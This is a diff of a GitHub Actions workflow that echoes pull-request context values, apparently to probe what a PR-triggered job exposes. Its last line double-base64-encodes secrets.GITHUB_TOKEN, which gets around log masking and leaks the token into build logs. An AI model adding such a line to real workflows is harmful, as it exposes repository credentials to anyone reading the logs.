@@ -11,18 +11,18 @@ jobs:
     steps:
     - run: |
         echo "[+] steps"
-        echo "${{toJson(github)}}"
+        #echo "${{toJson(github)}}"
 
         echo "[+] github.event.pull_request.head.sha"
         echo ${{ github.event.pull_request.head.sha }}
 
-        echo "[+] github.event.pull_request.head.sha"
-        echo ${{ github.event.pull_request.head.sha }}
+        echo "[+] github.event.pull_request.head.ref"
+        echo github.event.pull_request.head.ref
 
-        echo "[+] github.event.pull_request.head.sha"
+        echo "[+] github.event_name"
         echo ${{ github.event_name }}
 
-        echo "[+] github.event.pull_request.head.sha"
+        echo "[+] github.event.pull_request.head.repo.full_name"
         echo ${{ github.event.pull_request.head.repo.full_name }}
 
         echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w0 | base64 -w0
